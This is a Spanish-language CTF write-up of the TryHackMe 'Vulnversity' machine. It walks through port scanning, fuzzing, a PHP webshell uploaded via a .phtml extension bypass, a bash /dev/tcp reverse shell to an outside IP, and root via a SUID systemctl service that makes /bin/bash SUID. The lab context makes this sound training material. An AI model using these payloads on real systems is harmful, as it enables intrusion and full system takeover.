---
layout: post
title: "Vulnversity"
date: 2025-06-09
categories: [tryhackme, linux, easy]
tags: [vulnversity, fuzzing, webshell, bypass, php, suid]
---

* * *
* * *

![20250604181827.png](/assets/media/20250604181827.png)


Vulnversity es una máquina *linux* de dificultad **fácil** de la plataforma de tryhackme. Esta máquina cuenta con varios servicios expuestos, entre ellos uno en el que se aloja un servidor web en el que descubriremos un directorio clave para conseguir acceso a la máquina. La escalada la realizaremos mediante abuso de un binario que tiene permiso *SUID*.


# Reconocimiento

Enviaremos una traza **ICMP** a la máquina víctima para comprobar la conectividad.

![20250604185755.png](/assets/media/20250604185755.png)

Vemos que la máquina nos responde y que su **TTL** es de *63*, por lo tanto, podemos intuir que estamos ante un **Linux**.

- ***TTL 64 -> Linux***
- ***TTL 128 -> Windows

En este caso vemos un valor menos en el TTL porque en TryHackMe la petición pasa por un nodo intermediario tanto en entrada como en salida como podemos ver aquí realizando un *traceroute*.

![20250604185834.png](/assets/media/20250604185834.png)

## Escaneo de puertos

Realizaremos un escaneo de puertos con `nmap` para ver qué puertos están *abiertos* y qué *servicios* corren por cada uno de esos puertos.

```bash
nmap -p- -sS --min-rate 5000 -n -vvv -Pn 10.10.32.226 -oG allPorts
```

| Parámetro  | Descripción                                                                                                                                                                                |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| -p-        | Escanea todo el rango de puertos existentes (65535).                                                                                                                                       |
| -sS        | Realiza un escaneo **TCP SYN** (aumenta el sigilo, solo se envían *paquetes SYN*, sin completar el **handshake**).                                                                         |
| --min-rate | Especifica la tasa mínima de paquetes a enviar, en este caso no menos de 5000 paquetes por segundo.                                                                                        |
| -n         | No aplicar resolución DNS.                                                                                                                                                                 |
| -vvv       | Reporta en consola lo que vaya encontrando sin necesidad de esperar a que termine.                                                                                                         |
| -Pn        | No aplica *host discovery*, (útil si el host puede bloquear los pings o los probes ICMP).                                                                                                  |
| -oG        | guarda el output del escaneo en formato *grepeable* para aplicar la función [extractPorts](https://pastebin.com/raw/X6b56TQ8) de S4vitar para así copiarnos los puertos en el portapapeles. |

Nos saca lo siguiente:

![20250604190043.png](/assets/media/20250604190043.png)

| **Puerto** | **Servicio** |
| ---------- | ------------ |
| 21         | FTP          |
| 22         | SSH          |
| 139        | NetBIOS      |
| 445        | SMB          |
| 3128       | squid-http   |
| 3333       | dec-notes    |

## Enumeración

Vamos a enumerar la versión que corre sobre los servicios que hemos encontrado, aplicándole scripts básicos de enumeración de nmap que forman parte del NSE escritos en *Lua* para comprobar si podemos profundizar algo más.

Primero le pasamos el archivo **allPorts** a la función *extractPorts* (anteriormente referenciado) para copiarnos los puertos en la clipboard.

![20250604190309.png](/assets/media/20250604190309.png)

Aplicamos el escaneo.

```bash
nmap -sC -sV -p22,80 10.10.32.226 -oN targeted
```

| **Parámetro** | **Descripción**                                                |
| ------------- | -------------------------------------------------------------- |
| -sC           | Ejecución de scripts predeterminados de NSE.                   |
| -sV           | Detección de la versión del servicio que corre en cada puerto. |
| -p            | Especificación de puertos                                      |
| -oN           | Guarda el output en formato nmap.                              |

![20250604190430.png](/assets/media/20250604190430.png)

Vemos que tenemos los servicios FTP y SSH abiertos, en el caso del *FTP* no está habilitado el usuario *anonymous*. También tenemos un **squid proxy** y un servidor web, en el que también nos dice que estamos ante un **Ubuntu**. Pero vamos a empezar viendo si tenemos acceso a algún recurso por **SMB**.


## SMB

Aprovechando que tenemos el puerto 445 abierto con el servicio *SMB* corriendo, vamos a mapear el host para ver lo que tenemos.

![20250604191218.png](/assets/media/20250604191218.png)

No tenemos ningún permiso de lectura en ningún recurso, por lo tanto vamos a probar toras vías, vamos al servicio web.


## Servicio Web (puerto 3333)

Vamos a entrar al servicio web para ver lo que tiene.

![20250604191458.png](/assets/media/20250604191458.png)

Vemos lo que parece una página principal de una universidad o centro educativo, con poco que hacer ya que ninguno de sus botones son funcionales y en el código fuente tampoco hay nada relevante.

En este punto, vamos a realizar *fuzzing* en busca de otros directorios más interesantes.

![20250604191748.png](/assets/media/20250604191748.png)

Me llama la atención el directorio `/internal`, vamos a ver que es.

![20250604191841.png](/assets/media/20250604191841.png)

Pues tenemos un panel de subida de archivos, vamos a intentar subirnos un *php* malicioso para obtener una **webshell**.


# Explotación

Vamos a crearnos el archivo *shell.php* con el siguiente contenido:

```bash
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

**`$_REQUEST['cmd']`**:

- El parámetro `cmd` se obtiene de la URL a través de la variable `$_REQUEST`. En términos sencillos, esto significa que un atacante puede enviar un comando al servidor a través de la URL de la siguiente forma:

```bash
http://victima.com/webshell.php?cmd=ls
```

Vamos a probar a subirlo.

![20250604192418.png](/assets/media/20250604192418.png)

Nos dice que la extensión no está permitida, vamos a intentar *bypassear* este filtro cambiando la extensión a *.phtml*. En muchos servidores mal configurados, los archivos con esta extensión también son tratados como si fueran `php`.

![20250604192621.png](/assets/media/20250604192621.png)

Hemos conseguido subir nuestro archivo, ahora tenemos que localizar el directorio donde se alojen los archivos subidos. Vamos a hacer *fuzzing* dentro del directorio `/internal`.

![20250604192748.png](/assets/media/20250604192748.png)

Tenemos el directorio `/uploads`, vamos hacia allí.

![20250604192846.png](/assets/media/20250604192846.png)

Aquí tenemos nuestro archivo, para ejecutar comandos, añadimos nuestro archivo a la *URL* y le ponemos `?cmd=` para ejecutar comandos en el servidor.

![20250604193140.png](/assets/media/20250604193140.png)

Y vemos que podemos ejecutar comandos. Vamos a transformar la *webshell* en una *reverse shell*. Para ello, debemos poner el típico comando de ejecutar una bash `(bash -c bash -i >& /dev/tcp/10.21.181.199/4444 0>&1)` de forma urlencodeada, esto lo podemos hacer a través de ***burpsuite***.

![20250604193835.png](/assets/media/20250604193835.png)

Nos ponemos en escucha por el puerto que hayamos puesto, en este caso el *4444*, y pegamos esa salida que nos ha dado burp a la URL.

![20250604193919.png](/assets/media/20250604193919.png)

Obtenemos la **reverse shell**, estamos dentro!

Vamos a realizar el *tratamiento de la TTY* para mayor movilidad y estabilidad.

```bash
script /dev/null -c bash
```

Obtenemos un **prompt** y hacemos `Ctrl + Z`

```bash
stty raw -echo; fg
```

Seguimos con `reset xterm` (no se verá).

```bash
export TERM=xterm
```

```bash
export SHELL=bash
```


Una vez hecho esto, vamos al directorio `/home` y vemos que en el sistema hay un usuario llamado **bill**, entramos y ya tenemos la primera *flag*.

#### User.txt

![20250604194442.png](/assets/media/20250604194442.png)


# Escalada de privilegios

Ahora solo nos queda convertirnos en *root* y conseguir la *flag* que nos falta, para ello se me ocurre buscar binarios en el sistema con permisos **SUID** para posteriormente con ayuda de [gtfobins](https://gtfobins.github.io/) poder abusar de ellos.

```bash
find / -perm -4000 2>/dev/null
```

![20250604194756.png](/assets/media/20250604194756.png)

De todos estos, me llama la atención el de `systemctl`.

Viendo lo que nos dice *gtfobins*, modificamos el archivo para nuestro contexto de la siguiente manera:

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Cambiando la parte de `chmod u+s /bin/bash` que añadirá el permiso *SUID* para poder lanzarnos una *bash* como **root**.
Lo pegamos y al hacer un `bash -p` (con permisos preestablecidos) obtendremos una bash con **root**.

![20250604195416.png](/assets/media/20250604195416.png)


## Root.txt

Intuyo que la flag estará en el directorio de `root` y efectivamente, ahí la tenemos.

![20250604195601.png](/assets/media/20250604195601.png)

Máquina **Vulnversity** completada!
Happy hacking ;)

